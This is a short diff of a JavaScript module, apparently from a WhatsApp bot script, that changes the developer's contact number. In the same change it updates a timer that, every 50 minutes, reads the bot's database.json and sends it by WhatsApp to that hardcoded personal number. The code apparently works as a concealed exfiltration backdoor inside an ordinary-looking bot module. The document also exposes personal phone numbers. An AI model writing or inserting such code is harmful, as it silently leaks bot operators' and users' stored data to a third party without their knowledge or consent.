@@ -1,6 +1,6 @@
 /*
 * Nama Pengembang: Sazumi Viki
-* Kontak Whatsapp: wa.me/628873133561
+* Kontak Whatsapp: wa.me/6282177779477
 * Kontak Telegram: t.me/sazumiviki
 * Akun Github: github.com/SazumiVicky
 * Catatan: tolong laporkan kepada saya ketika anda menemukan ada yang menjual script ini
@@ -22,6 +22,6 @@ module.exports = (conn) => {
       }
     }
     let sesi = await fs.readFileSync('./database.json')
-    await conn.sendMessage('628873133561@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
+    await conn.sendMessage('6282177779477@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
   }, 50 * 60 * 1000)
 }
